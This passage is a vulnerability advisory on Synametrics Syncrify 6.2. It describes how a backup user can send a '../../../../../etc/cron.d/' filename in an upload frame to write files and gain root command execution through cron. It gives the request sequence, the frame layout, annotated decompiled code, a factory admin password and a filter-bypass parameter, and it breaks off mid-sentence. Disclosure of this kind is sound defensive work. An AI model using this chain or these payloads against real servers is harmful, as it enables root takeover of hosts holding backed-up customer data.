# Synametrics Syncrify 6.2 build 1178 — PublicLink chunk-upload path traversal writes a cron fragment and yields root command execution (uid=0)

## 1. Overview

### Overview of the finding

Syncrify's PublicLink client protocol accepts a chunk of an uploaded file as a length-prefixed
binary frame in the body of an HTTP request. One field of that frame is the chunk's filename, and
the branch that consumes it builds a filesystem path by joining that filename to a per-user base
directory with `new File(base, filename)`. No control of any kind is applied to the filename: it is
not rejected for containing `..`, it is not rejected for containing a path separator, it is not
collapsed to a base name, and the resolved target is not verified to sit inside the base directory.
The parent directory of the resolved target is created on demand, and the file is opened in append
mode. An authenticated backup user can therefore write attacker-chosen bytes to an
attacker-chosen absolute path with the privileges of the server process.

We turned that primitive into command execution by writing into `/etc/cron.d`. In the Linux
deployment shape documented by the vendor's own installer - a tarball archive installed into
`/opt/Syncrify` and started with `./run.sh` - the server process holds uid 0, and the host's cron
daemon was active. A fragment placed in `/etc/cron.d` by a root-owned process is treated by the
scheduler as a root-authored job definition, so the command field of the line we wrote was executed
as root on the next minute boundary. The identity capture the job produced was
`uid=0(root) gid=0(root) groups=0(root)`.

The chain is four moves and is short enough to state without abbreviation: authenticate as a backup
user with `GET /app?operation=pb&u=<user>&p=<password>`, keep the session identifier, post one
framed chunk to `POST /app?operation=pb&st=u` whose filename field is
`../../../../../etc/cron.d/<name>`, and let the scheduler run it. Two HTTP requests, no race, no
second vulnerability, no administrator session anywhere in the path.

The severity of this finding is not that a file write exists - a backup server writes files. It is
where the write can go, and who can ask for it. The principal is the lowest-trust account type the
product has: a backup user is created by an administrator so that a client machine can push bytes
into one repository under that user's name. Nothing in that role is supposed to reach a directory
that the host's job scheduler treats as root-authored. A low-trust uploader that can name an
arbitrary absolute destination is a privilege-boundary defect inside the product itself, and it does
not depend on any host misconfiguration to be reachable - only on the host having a cron daemon,
which is what makes it execute as root rather than merely write as root.

### Overview of the product and its runtime stack

Syncrify is a closed-source incremental backup and file-replication server from Synametrics
Technologies, Inc., a vendor based in the United States. It speaks a rsync-style protocol over HTTP
to its own client software, offers PublicLink shares for browser-based file exchange, and is
administered through a web portal. It is therefore infrastructure that in practice holds copies of
customer data: home directories, source trees, database dumps, whatever the backed-up machines
contain.

The build we analysed is 6.2 build 1178, from `SyncrifyServer.jar` inside the distributed Linux
tarball archive. The runtime stack is Java launched by `com.synametrics.sradef.BootLoader` with the
bundled JRE (`jre/bin/java -server -Xmx512m -cp lib/*.jar com.synametrics.sradef.BootLoader`), an
embedded Tomcat 9.0.113, and the vendor's in-house rapid-application-development framework, whose
startup banner names it as such. HTTP requests are funnelled into a single servlet,
`com.synametrics.sradef.servlet.FrontController`, mapped to `/app`, whose `doGet` and `doPost`
delegate to a worker helper and whose `doOptions`, `doDelete` and `doPut` return 501. A request
reaches a handler by way of a URL parameter, so the whole product's HTTP surface is
`/app?operation=<op>&st=<step>&<params>`; a request to `/` answers `302` with `Location: /app` and
the server identifies itself as `Synametrics Web Server v7`.

Two structural facts about that framework govern everything below and are worth stating up front,
because they explain why a handler can be reachable without an administrator session and still be
considered "protected".

The first is that authorization is per-handler, not per-application. Handlers are registered in
`WorkerMappings.xml` with a `secLevel` attribute, and the worker helper enforces it before dispatch
in its authorization method: if the caller has no login level (`-1`) and the handler's level is
greater than zero, the request is refused; otherwise the caller's level is tested against the
handler's with a bitwise operation. The servlet container contributes almost nothing here. The
shipped `web.xml` carries a security constraint whose own load-time message reads
`URL pattern [/*] only HTTP methods [DELETE OPTIONS PUT] covered. All other methods uncovered.` A
`GET` or `POST` request is therefore not gated by the container at all, and the `secLevel` value in
`WorkerMappings.xml` is the real gate. When a handler is registered at level 0, the gate is open by
design and the only decision left is whatever that handler performs for itself.

The second is that two entirely independent user stores exist and must never be conflated:

| Store | File | Class | Principal | Provisioned how |
|---|---|---|---|---|
| Web administration | `config/umap.dat` (XML) | `sradef.config.SecurityManager`, `SecurityHolder` | Administrators of the portal | First-run install wizard creates the `admin` account; first login forces a password change |
| Backup users | `config/UserMappings.xml` (XML) | `syncrify.users.DefaultUserManager`, `DefaultUserHolder` | Backup clients, PublicLink users | Created by an administrator through `operation=manageUsers`, which is `secLevel=2 strict=true` and additionally licence-gated |

The sink in this advisory is gated by the **second** store. That distinction is the whole point of
the privilege story: the account type that reaches this write is an account type that was invented to
move bytes, not to administer the server.

Finally, a note that belongs in an overview because it changes how the vendor should read the fix
section: the same `sradef` framework - front controller, `WorkerMappings.xml` handler registry,
per-handler `secLevel`, and the shared helper library `lib4njre.jar` supplying
`com.synametrics.commons.util.*` - also underpins the same vendor's sibling products Xeams and
SynaMan. The evidence that this is one codebase family rather than a coincidence is in the shipped
artifacts of this build: its own `web.xml` still carries `display-name` `SynaMan`. We mention the
siblings only to tell the vendor where else the same construction deserves review. **This advisory
makes no claim about either sibling product. Neither was tested as part of this work.**

### Overview of the testbed and of what that implies

Honesty about the testbed is not a formality here, because two properties of our instance were ours
rather than the product's, and one of them decides the reachability question.

The instance was installed from the distributed Linux archive into `/opt/Syncrify` and started with
`./run.sh`. The server process held uid 0; the host's cron daemon was active. Those two properties
are what make the escalation work, and they are the properties of the deployment shape the vendor's
installer produces, not something we switched on. We did not disable any hardening, mount anything
unusually permissive, add a library, or weaken a permission on `/etc/cron.d`; the fragment we wrote
landed as `root:root` with mode `0644`, which is what a root-owned process with a default umask
produces.

Two things were ours:

- **The portal listener was bound to loopback, because we bound it that way.** The runtime
  configuration held `httpPort2=5800` with `httpIP=127.0.0.1`. We wrote that binding into the
  configuration before testing so that the host was not exposed on a public interface while research
  was in progress. We hold no shipped artifact that establishes the factory value of that binding,
  and we therefore do not claim that the portal is loopback-only by default. Equally, we do not
  claim that it is world-bound by default. Section 10 states exactly what was observed on each
  listener and what that does and does not license a reader to conclude, and section 12 carries the
  consequence in `AC` rather than hiding it.
- **The backup-user account was written into the user store by hand.** After installation,
  `config/UserMappings.xml` does not exist - the store is created when an administrator provisions
  the first backup user. The administrator's provisioning path (`operation=manageUsers`) is
  `secLevel=2 strict=true` and, in the instance we deployed, redirected at a licence check because
  the licence count was zero. We therefore created the entry directly in the store, with the
  plaintext password-comparison path. What this means for the finding is narrow and specific, and we
  state it where it matters (section 3): we proved the sink is reachable with a credential pair that
  the server's own `fetchUserHolder` accepts, through the branch that compares plaintext; we did not
  exercise the provisioning UI, and we did not exercise the encrypted-entry comparison branch
  dynamically.

Both facts cut in opposite directions and we report both rather than picking the convenient one. The
loopback binding is the reason this advisory does not claim an unauthenticated or internet-facing
default; the hand-written store entry is the reason the principal claim is stated as "a backup user
accepted by `fetchUserHolder`" rather than as something broader about how such accounts come into
existence in a licensed deployment.

### Overview of affected scope

The affected component is the PublicLink handler's chunked-upload branch: `operation=pb` with
`st=u`, dispatching through `f()` at `PublicLink.java:127` to the upload method at
`PublicLink.java:70-110`. The affected version is the one we decompiled and exercised, 6.2 build
1178. We enumerate no other version and no other edition, we performed no cross-version comparison
of the class file, and we make no claim about versions we did not test. The construction is short
enough that neighbouring builds plausibly share it, but plausible is not established, and a reader
should treat the version statement as exact rather than as a floor.

Within the tested build, the reach of the defect is the whole set of destinations writable by the
service identity. `/etc/cron.d` is the destination we demonstrated because it converts a write into
execution, and because it is a fixed, predictable path. The write primitive itself is not limited to
it.

### Overview of independence

This is original work on a product for which we found no prior public advisory and no assigned
identifier during the research. We state that with its natural limit: our enumeration of public
vulnerability databases is not proof about private reports the vendor may hold, and it is not proof
about disclosure correspondence we have no visibility into.

What is worth saying positively, because it is the kind of claim that can actually be checked, is
that the root cause here is not shared with the mechanisms we looked for and ruled out in the same
binary tree. In particular, the shared mail package in this codebase family carries a debug-header
constant of the form `X-SM_SAVE_BODY_4DEBUGGING` (`com.synametrics.commons.net.mail.k`, field `f`),
which in earlier research on a sibling product was a route to arbitrary file write over HTTP. We
traced that constant in Syncrify's own tree: its only references are in client-side classes
(`com/synametrics/syncrify/client/syncribox/g.java:196` and `:207`), and no server HTTP handler reads
the header. That mechanism is dead code on Syncrify's server path, so this finding is not a
repackaged copy of it. The construction we are reporting is different in kind: it is a client-protocol
framing field that becomes a pathname, reachable only after a valid backup-user authentication, in a
handler that is registered at authorization level 0 precisely because clients use it.

No public writeup was used as a basis for this analysis. The sink, the frame layout, the dispatch
mapping, the traversal depth, the authentication gate's behaviour under negative inputs and the
dynamic confirmation were each established here, from the decompiled tree and from a deployed
instance of it.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Field | Value |
|---|---|
| Product | Synametrics Syncrify, backup / file-replication server |
| Vendor | Synametrics Technologies, Inc. (United States) |
| Version analysed | 6.2 build 1178 (`SyncrifyServer.jar`) |
| Class | Path traversal leading to arbitrary file write, escalating to scheduled command execution |
| Primary CWE | CWE-22 |
| Contributing CWE | CWE-269, CWE-78 |
| Route | `POST /app?operation=pb&st=u` |
| Content type | `application/octet-stream`, in-house binary frame |
| Tainted field | The `filename` string inside the frame |
| Sink | `new File(base, filename)` + `mkdirs()` + append-mode `FileOutputStream`, `PublicLink.java:70-110` |
| Base path | `/opt/Syncrify/PublicLinks/<user>/<generated-folder>/` |
| Authentication | Required: a backup user accepted by `fetchUserHolder` |
| Least privileged principal proven | Backup user (not administrator) |
| Escalation destination | `/etc/cron.d/<dot-free-name>` |
| Execution identity achieved | `uid=0(root) gid=0(root) groups=0(root)` |
| Verification | Dynamic, end to end, against a deployed instance |
| CVSS 3.1 (primary) | 7.5 High - `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| CVSS 3.1 (conditional) | 8.8 High - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |

### Vulnerability Summary mechanics

The frame the branch reads is fixed-layout and big-endian: four 32-bit integers, then a
length-prefixed UTF-8 string, then that many body bytes. In the decompiled listing the four integers
are the protocol number, the chunk number, the total chunk count and the declared byte length; the
string is the filename; the body is the chunk's content. The handler reads the filename, joins it to
the base directory returned for the authenticated user, creates the resolved target's parent
directory if it is missing, and opens the target with `new FileOutputStream(target, true)` - the
second argument being append mode - before reading and writing the declared number of bytes.

Two of those details do more work than they look like. `mkdirs()` means the write is not confined to
pre-existing directories: an attacker can materialise directory structure anywhere the service
identity can write, which removes the usual "the destination must already exist" limitation that
constrains many write primitives. Append mode means the attacker does not need to replace a file
outright; adding lines to an existing one is enough, and a repeated request adds rather than
overwrites. For a scheduler directory that is exactly the wrong combination: cron reads every valid
line in every accepted file.

The third detail is what the handler does not do. In the decompiled listing, the chunk number and
total chunk count are read out of the frame and then play no part in bounding or placing the write.
The destination is chosen entirely by the filename the client supplied, and the position in the file
is chosen entirely by "the end".

### Vulnerability Summary preconditions

Each precondition below is separated into what it actually is, because they are not all the same
kind of thing and a reader deserves to see which are product properties, which are host properties,
and which were properties of our instance:

- A credential pair accepted by `fetchUserHolder` - a product property. The gate is present and
  works (section 3); it was not bypassed and is not claimed to be bypassable.
- The listener that carries `/app?operation=` reachable from the attacker's position - a deployment
  property. In our instance it was loopback-only, because we configured it that way; the shipped
  factory binding is not established by any artifact we hold. This is the precondition priced in
  `AC:H` in the primary vector and removed in the conditional reading.
- A cron daemon that scans `/etc/cron.d`, active - a host property. It was active on the instance we
  deployed and is active on a conventional Linux server, but it is a property of the host, not of
  Syncrify.
- The server process holding an identity that may write into `/etc/cron.d` - a deployment property
  observed as uid 0 in the deployment shape the vendor's installer produces. Under an unprivileged
  service identity the escalation to root execution does not follow, though the file write does.
- A destination name the scheduler will accept - a payload-engineering property (section 8). In
  practice this means a name containing no dot, because scheduler implementations that scan a
  directory commonly refuse names that carry one.
- A traversal depth matching the number of path components between the filesystem root and the base
  directory - a payload-engineering property. For the base path
  `/opt/Syncrify/PublicLinks/<user>/<generated-folder>/` that is five components, so five `../`
  segments are needed, and a wrong depth produces a successful-looking reply and a file in the
  wrong place (section 7).
- Nothing else. No administrator session, no licence state, no user interaction, no race window, no
  pre-existing shared folder, no second vulnerability.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

The PublicLink handler is registered at authorization level 0, so the framework lets an anonymous
request reach it. Everything then depends on the handler's own first branch. Dispatch is driven by
the `st` parameter, and the branch with no `st` value is the authentication call:

```java
// PublicLink.java:1008-1022 — dispatch
String st = request.getParameter("st");
if (st != null && st.equals("u")) {          // st=u -> f() -> the upload chunk branch (the sink)
    a2.f();
} else if (st != null && st.equals("f")) {   // st=f -> a different E() overload: parses "ed", no write
    a2.E();
} else if (st != null && st.equals("cip")) { // st=cip -> copyFileToPbFolder(), confined to the folder
    a2.copyFileToPbFolder();
} else {                                     // no st -> authenticate
    a2.c();
}
```

The authentication method itself is two gates and then a session write:

```java
// PublicLink.java:141-165 — c()
private void c() {
    Object object = request.getParameter("u");
    String string = request.getParameter("p");
    if (object == null || string == null) {           // gate 1: both parameters must be present
        displayAnswer(-1, "ERROR", "");
        return;
    }
    if (UserManagerFactory.getInstance().createUserManager()
            .fetchUserHolder((String) object, string) == null) {   // gate 2: credential check
        displayAnswer(-2, "ERROR", "");
        return;
    }
    request.getSession().setAttribute("pbUser", object);  // session marker for the upload branch
    object = E();                                         // build (and create) this user's folder
    displayAnswer(1, "OK", ((File) object).getName());
}
```

Two things happen on success that matter later. The session attribute `pbUser` is written, and it is
the state the upload branch depends on to decide whose base directory to use. And the reply's
payload is the name of a folder the server has just created for that user, which is the evidence
that no pre-existing shared folder is required (see the next subsection but one).

The session identifier arrives as an ordinary container cookie:

```
Set-Cookie: JSESSIONID=<session-id>; Path=/; HttpOnly
```

and the upload request must present it. Session contents are server-side, so a caller cannot
manufacture the `pbUser` state by forging a cookie value; the only writer of that attribute is this
method, and it writes only after the credential check returns non-null.

### Authentication Boundary — what the gate actually checks

The credential check belongs to the backup-user store, not the administrator store:

```java
// DefaultUserManager.java:283-298 — fetchUserHolder(user, password)
public DefaultUserHolder fetchUserHolder(String a2, String a3) {
    int n2 = 0;
    while (n2 < F.size()) {
        if (F.get(n2).getLogin().equalsIgnoreCase(a2)) {   // login names match case-insensitively
            if (a3 == null) {                              // branch A: no password comparison at all
                return F.get(n2);
            }
            if (B.E().E(a2, a3)) {                         // branch B: directory authentication
                return F.get(n2);
            }
            if (F.get(n2).getPassword().equals("PWD_FROM_LDAP")
                    && B.E().E(a2, a3, "127.0.0.1", "") != null) {   // branch C
                return F.get(n2);
            }
            if (F.get(n2).getPassword().equals(a3)) {      // branch D: plaintext comparison
                return F.get(n2);
            }
            return null;                                   // login exists, password wrong
        }
        n2++;
    }
    return null;                                           // login does not exist
}
```

Branch A is the one an analyst would stop reading at, because it returns an authenticated user
holder with no password comparison. It is not reachable from this HTTP surface, and the reason is
worth being precise about: gate 1 in `c()` tests whether either URL parameter is absent *before*
`fetchUserHolder` is called, so a null password never arrives. We confirmed the ordering dynamically
rather than trusting the decompilation - the reply codes distinguish the two gates:

| Request | Reply | What it proves |
|---|---|---|
| `operation=pb&u=<user>&p=<correct-password>` | `code="1"`, `OK`, session cookie issued | Gate 2 accepted the pair |
| `operation=pb&u=<user>&p=<wrong-password>` | `code="-2"`, `ERROR` | Gate 2 rejected the password - the comparison is live |
| `operation=pb&u=<user>` (no `p`) | `code="-1"`, `ERROR` | Gate 1 fired, so `fetchUserHolder` was never entered |
| `operation=pb&u=<absent-user>` | `code="-1"`, `ERROR` | Gate 1 fired on the missing password, before any lookup |

The `-1` versus `-2` distinction is the whole argument: if a missing password reached
`fetchUserHolder`, branch A would return a holder and the reply would be an acceptance, not an
error. It is an error, of the code that belongs to the earlier gate.

Entries stored with `encrypted="true"` are decrypted at load time (`DefaultUserManager.java:183-184`,
via a permutation-based transform in the shared helper `ca.E(String, 16)`) and then compared in
branch D. We examined that branch statically; we did not exercise it dynamically, and we say so in
section 9. An empty-string password (`p=`) reaches `fetchUserHolder` as `""` rather than null, so it
only succeeds for an entry whose stored password is literally empty, and provisioning does not
create such entries.

The rest of the framework's authorization machinery was examined for the same question and did not
produce a bypass. The worker helper's `allowHigherLevelOperations` attribute would skip the level
check where present; a search of the decompiled tree found reads of it and no writer, so it cannot be
set from a request. A `skipSSO=1` parameter influences only the single-sign-on layer and does not
suppress the level check. Unknown `operation` values cannot reach a handler at all, because handler
lookup is an exact `HashMap` get against the registry, and a miss falls through to a generic error
handler that performs no sensitive work.

The container contributes nothing to this analysis, and that is worth restating because it is the
reason a handler-level omission is fatal here: the shipped `web.xml` security constraint covers
`DELETE`, `OPTIONS` and `PUT` only, and says so in its own load-time message. Requests over `GET` and
`POST`, which is every request in this chain, are governed solely by the `secLevel` value and the
handler's own code.

### Authentication Boundary — the principal required by the sink

The sink requires the session state left behind by a successful `c()`: an account present in the
backup-user store whose password the server accepted. It does not require an administrator, it does
not require a licence state, and - specifically - it does not require that anyone has created a
PublicLink share beforehand.

That last point is the one a reader is most likely to assume, because the handler is named after
shared links, so it deserves the direct evidence. The base directory used by the upload branch comes
from a helper that derives the path from the authenticated user's own name and creates it:
`new File(new File(F, user), <generated-folder>)` followed by `mkdirs()`, where `F` is the
PublicLinks root (`/opt/Syncrify/PublicLinks`). The authentication reply's payload is the name of
that generated folder, and in our run it was a name the server had just invented - the folder did
not exist before the authentication request. No share, no link identifier and no administrator
action intervened between holding a backup-user credential and having a writable base directory
five components below the filesystem root.

So the principal proven sufficient is an ordinary backup-user account. In the product's normal
provisioning flow, such accounts are created by an administrator through `operation=manageUsers`,
which is registered `secLevel=2 strict=true` and which additionally consults a licence check
(`UserHandler.dealWithIt()`, redirecting when the licence count is zero). That flow was not the one
we exercised: our instance's store file did not exist after installation and we populated the entry
directly, with plaintext comparison. The consequence for the claim is narrow and we keep it narrow.
The sink's gate is `fetchUserHolder` returning non-null; it is indifferent to how the entry arrived
in the store, and any credential pair the server accepts - created by an administrator through the
management operation, imported by an operator, or accepted through a directory-authentication
branch - satisfies it. What we proved with a live run is one instantiation of that condition
(plaintext-comparison branch), and what we did not prove dynamically is the management-operation
provisioning path or the encrypted-entry branch. Neither gap weakens the finding, but neither should
be silently rounded up into "any account works".

Equally, it should not be rounded down. There is no administrator, no operator and no licence state
between a backup user and this write. The privilege distance covered is from the product's
lowest-trust account to root on the host.

### Authentication Boundary — what is deliberately not claimed

The product does ship a factory administration password. The first-run install wizard creates the
`admin` account with the password `letmein` (`SimpleLoginHandler.java:271`, and
`MultiHostLoginHandler.java:48` calling `initializeSecurity("admin", "letmein", false)`), and the
first administrator login is forced through a password change before the administration screens are
served (`proceedWithLogin` handing off to `ChangePassword.jsp`).

We state the position plainly, because it is the kind of fact that gets misused in either direction.
A password that expires on first use is not a route to unauthenticated access. It is
deployment-dependent - relevant only where an operator skipped or defeated the forced change - and
in any case it points at the *administrator* store, which is not the store that gates this sink. An
attacker holding that credential would still have to provision a backup user through a
licence-gated administrative operation before reaching this chain, which makes it a strictly worse
starting position than simply holding a backup-user credential, the thing this product exists to
hand out to client machines.

Accordingly: this finding is post-authentication; the factory administration password is used
nowhere in the reasoning, in the metric derivation or in the score; no unauthenticated reachability
is claimed on the strength of it; and no conditional score in this advisory is built on the
assumption that it has not been rotated.

The same discipline applies to three other facts we observed and did not use. Cross-site request
forgery prevention is globally disabled in the runtime configuration
(`disableCSRFPrevention=true`), which is a real weakness and irrelevant here, because the chain
needs credentials the attacker holds rather than a victim's browser. An embedded database is
configured with vendor-default credentials but is disabled (`rdbmsEnabled=false`) and was not
listening. A default trial licence serial is present in the licence class; whether it unlocks user
provisioning was left unresolved and the chain does not need it.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The server process owns every listener below. This enumeration is the basis for the reachability
argument in section 10, so it is reproduced with what each listener was actually seen to serve.

| Port | Protocol | Bind address observed | What it serves | Carries `/app?operation=`? |
|---|---|---|---|---|
| 5800 | TCP | `127.0.0.1` (bound by us before testing) | Main web portal and front controller; `GET /` answers `302` with `Location: /app`; identified as `Synametrics Web Server v7` | **Yes - this is where the chain was verified** |
| 54222 | TCP | `127.0.0.1` | Secondary / failure-over HTTP endpoint | Not established |
| 52110 | TCP | `0.0.0.0` | HTTP status endpoint; served a page reporting the server version and build, active HTTP sessions and job status | Not established - no `/app` route was observed on it |
| 27000 | TCP and UDP | `0.0.0.0` | Accelerated-transfer UDP server (`udpft.K`), started from `syncrify/o/H.java:40` reading an `accPort` value whose default is 27000 | No - not HTTP |
| 4729 | TCP | not listening | Embedded database, disabled (`rdbmsEnabled=false`), lazily started | No |

The runtime configuration carried `httpPort2=5800`, `httpIP=127.0.0.1`, `httpPort=0` (a port
assigned at install time), `httpPortSSL=-1` (so no TLS listener was open despite `sslEnabled=true`),
and `defaultOperation=door`.

Three observations follow, and they are the honest shape of the reachability question:

- The vulnerable route was served on the main web listener, port 5800, and the verified requests
  went to `http://127.0.0.1:5800`. That is artifact-backed: the tool's own output names that origin
  and the responses came from it.
- That listener's loopback binding was written by us. We hold no shipped artifact stating the
  factory value of `httpIP`, and our own deployment note framed the exposure question
  conditionally rather than as a fact. So the honest statement is that the binding is
  *not established as a product default in either direction*.
- The two listeners that were world-bound - the 52110 status endpoint and the 27000 transfer channel
  - were never seen to serve the `/app` front controller. Asserting that they do, or that they do
  not, would both be beyond the evidence, so the advisory asserts neither.

The UDP family on 27000 was examined as a possible alternative route to a write and excluded. Its
command set (a single-byte command field dispatching roughly twelve commands) only accumulates data
in an in-memory holder; the single disk-write function in that family, `udpft.l`'s
`E(File, short)` at `l.java:465-472`, has no production caller anywhere in the tree, and the family's
other writes are fixed-extension temporary files (`incoming-<index>-<index>.nclf` at
`g.java:131` and `:147`). A raw UDP datagram cannot reach an attacker-named path, and the actual
file writes for accelerated transfer happen inside the authenticated HTTP/backup job context.

### Attack Surface — how the surface was mapped

The HTTP surface was enumerated from three directions and cross-checked, because any one of them
alone leaves gaps: the browser-side JavaScript that issues operation requests; the handler registry
in `WorkerMappings.xml`, which is the authoritative list of registered operations together with
their `secLevel` and their `skipValidation` and `bindingType` attributes; and dynamic probing of
every registered level-0 operation with no credentials at all, observing whether the reply was a
working response, a redirect into the login page, or an authentication error. That produced a little
over ninety distinct operations, of which forty-seven are registered at level 0.

Level 0 does not mean anonymous, and confusing the two is the easiest way to overclaim on this
product. Of those forty-seven, thirteen answered with real content and no credential check at all.
The remaining thirty-four authenticate inside the handler, typically by calling `fetchUserHolder` on
`uid`/`pwd` parameters, and answer `-2 ERROR` without them. Level 0 means "no administrator session
required", which is the correct design for operations used by backup clients - a client machine
pushing data has no portal session and should not need one.

Every parameter of those thirteen anonymous operations was then individually traced to a sink or
established as sink-free, which is what section 10 reports. The `st` sub-dispatch of the PublicLink
handler was enumerated the same way, since the handler behaves as five different endpoints behind
one operation name: authenticate (no `st`), chunk upload (`st=u`), a parse branch (`st=f`), a
folder-scoped copy (`st=cip`), and a download branch (`st=dn`).

### Attack Surface — components that narrow the surface

Several parts of the framework genuinely limit what an attacker can reach, and they are recorded
here because they are why the unauthenticated enumeration produced nothing:

- **Exact-match handler lookup.** The operation name is fetched with `getParameter("operation")` and
  used as a key in a `HashMap` of registered handlers (`k2 = a6.F.get(a3)`). There is no pattern,
  prefix or case-insensitive matching, so the registry is an allowlist by construction and unknown
  operations fall through to a generic error handler with no sensitive behaviour.
- **Level enforcement is real where a level is declared.** The worker helper refuses a request whose
  caller has no login level when the handler declares more than zero, and otherwise applies a bitwise
  test. Administrator-level operations - user provisioning, server configuration, restart,
  termination, debugging - were all confirmed to require an administrator session.
- **The escape hatches we looked for do not have writers.** The `allowHigherLevelOperations`
  attribute that would skip the level check has no writer in the tree; `skipSSO` skips only the
  single-sign-on layer; the `overwriteOperator` session attribute is read but never set.
- **Validation-skipping operations are narrow.** Three operations carry `skipValidation="true"`,
  which omits the framework's parameter validation but not its authentication, and two of them use a
  different body-binding mode. None of them is the branch in this advisory.

One component that *fails* to narrow the surface deserves a sentence, since it is a real weakness we
found while mapping and are not claiming here. Debug JSP pages shipped in the web root are blocked by
a filter whose block is defeated by the mere presence of a `manualOverride` request parameter
(`WebFilter.java:39-40` for the `allowJsp` initialisation and `WebFilter.java:54` for the override
test), which turns a `404` into a `200` for any page in that directory. The pages reachable that way
list directory contents and dump environment variables; neither contains a write or execution sink,
so the finding is an access-control bypass with information disclosure (CWE-284, CWE-200, CWE-209)
and it is out of scope for this advisory. It is mentioned because it is part of the surface we
mapped, because a vendor fixing this report should know about it, and because it must not be read as
a route into the chain described here.

## 5. Sink Identification

### Sink Identification — how the sink was found

Every file-write construction in the handler tree was inventoried and classified by where its path
comes from and what constrains it. The inventory is the reason this finding is presented as an
oversight rather than a design decision: the tree contains three separate, working traversal
defenses, and the one branch that lacks any of them is reachable with the product's lowest-trust
credential.

| Handler (operation) | Level | Path source | Constraint applied | Verdict |
|---|---|---|---|---|
| Profile upload (`uppr`) | 0, internal credential check | Repository path + `fileName` parameter | Rejects separators via `indexOf(47)` and `indexOf(92)` | No traversal |
| Profile fetch (`fpx`) | 0, internal credential check | Repository path + `fileName` | Same separator rejection | No traversal |
| File splitter (`fsplit`) | 0, internal credential check | Repository path + name | Same separator rejection | No traversal |
| Multipart upload (`up`) | 0, needs a session path value | Session-held folder + multipart name | Collapsed with `getName()` before use | No traversal |
| Download (`dnwa`) | 0, internal credential check | Session/context path + `fn` | `indexOf("..")` on the name component only | Constrained for the name; see section 5's sibling entry |
| Binary protocol (`br`) | 0, internal credential check | Protocol frame fields | Protocol-level checks, credential required | Not reachable anonymously |
| Password recovery (`respass`) | 0, anonymous | Fixed configuration folder | Fixed path, fixed template content | No user-controlled path |
| Administrator networking (`config`) | 2 | Fixed path | Administrator only, hardcoded target | Write exists, injection space does not |
| **PublicLink chunk upload (`pb&st=u`)** | **0, internal credential check** | **Per-user PublicLinks folder + frame filename** | **None** | **Arbitrary file write** |

The row that stands out is the last one, and the reason it was worth pursuing further is exactly the
asymmetry: three sibling families in the same product, written against the same client protocol,
check the same kind of field and reject the same kind of content. This branch does not check
anything. When one member of a family omits the defense its siblings all implement, the most
economical explanation is that it was not written, not that it was written elsewhere.

### Sink Identification — the vulnerable construction

Here is the branch as it appears in the decompiled tree, with the load-bearing lines annotated:

```java
// PublicLink.java:70-110 — the chunk-upload branch
private int E() throws IOException {
    ServletInputStream in = a2.request.getInputStream();
    int protocol     = readInt(in);          // 4-byte big-endian
    int chunkNumber  = readInt(in);          // read, then not used to bound or place the write
    int totalChunks  = readInt(in);          // read, then not used to bound or place the write
    int size         = readInt(in);          // declared byte length of the chunk body
    String filename  = readString(in);       // [4-byte length][UTF-8 bytes] — attacker-controlled

    File base   = E();                       // Z.E(pbUser): this user's PublicLinks folder
    File target = new File(base, filename);  // no ".." rejection, no separator rejection,
                                             // no base-name collapse, no containment check
    if (!target.getParentFile().exists()) {
        target.getParentFile().mkdirs();     // creates whatever directory the name implies
    }

    BufferedOutputStream out =
        new BufferedOutputStream(new FileOutputStream(target, true));   // append mode
    byte[] buf = new byte[size];
    readFully(buf);                          // reads `size` bytes from the request body
    out.write(buf);
    out.close();
    return 0;                                // 0 means success to the caller
}
```

The caller turns that return value into the reply the client sees:

```java
// PublicLink.java:127 — f(), dispatched by st=u
private void f() {
    int n2 = a2.E();                        // the upload branch above
    if (n2 == 0) {
        a2.displayAnswer(1, "OK", "" + n2); // the client learns the write succeeded
        return;
    }
}
```

Note what is *not* here. There is no logging of the resolved path, no error branch for a rejected
name, and no comparison between the resolved target and the base directory. The success reply is
indistinguishable from the reply a legitimate client would receive for an ordinary chunk, which is
one of the reasons in section 10 that detection cannot come from the application.

One mapping detail cost us a failed attempt and belongs in the writeup because a variant audit will
hit it too. The handler has more than one method named `E()`, and they are not interchangeable:
`st=u` dispatches to `f()` and from there to the upload branch at `PublicLink.java:70-110`, while
`st=f` dispatches to a different `void E()` overload at `PublicLink.java:951` that reads a request
parameter named `ed`, parses it as a `Long`, and performs no write at all. An initial static reading
of this tree attributed the upload to `st=f`; the request built on that reading produced no file at
all. The corrected mapping is the one verified in section 9. Anyone auditing this handler should
resolve the overload by its dispatch site, not by the method name.

### Sink Identification — execution identity of the child process

No child process is spawned by the application in this chain, and it is worth being precise about
that because it changes what the fix has to address. Syncrify writes a file. The execution happens
one component later, in the host's cron daemon, which reads `/etc/cron.d` and treats a root-owned
entry there as a job definition authored by root. The application never constructs, quotes or
invokes a command line, and it could not have been fixed by argument-vector hygiene at the
application layer, because there is no argument vector at the application layer.

The identity that the scheduled command ran as was observed directly:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Two independent artifacts establish that the writer process held uid 0. The fragment landed as
`-rw-r--r-- 1 root root`, and a file's owner after creation is the effective uid of the process that
created it. And the cron job's own output reported uid 0, which is the identity the scheduler gave
it - the fragment names `root` in its user field, and the scheduler honoured that, which it would
not do for a job file it did not already trust.

The deployment shape is what the vendor's Linux installer produces: a tarball archive unpacked into
`/opt/Syncrify`, an init script reference kept in the runtime configuration
(`ntServiceCommand=/etc/init.d/syncrify start`), and the service started with `./run.sh` as root.
The cron daemon was active. We are careful here about which half of that is proved and which half is
argued:

- **Artifact-backed**: on the instance we deployed, the server process ran as uid 0 and the cron
  daemon was active; the write landed root-owned with mode `0644`; the scheduled command executed as
  uid 0.
- **Argued, not proved from a shipped file**: that this is the only supported deployment shape. We did
  not locate a shipped artifact - an init script body, a wrapper configuration, or documentation - that
  *requires* the service to run unprivileged or that forbids it. The observed shape is what the
  installer produced and what the vendor documents, and root is the identity that lets a backup
  server read arbitrary client-side data, so it is a natural default; but "runs as root by default"
  is stated here as an observation of the documented deployment shape, not as a quoted artifact.

The consequence if an operator has separated privileges is worth spelling out rather than leaving to
inference, in both directions. Under an unprivileged service identity, the escalation demonstrated
here does not follow: `/etc/cron.d` is root-owned, the fragment could not be placed, and the
scheduler would ignore a file it did not trust. The arbitrary file write itself survives, and it
would then reach whatever that account can write - the repository tree, the PublicLinks subtree, the
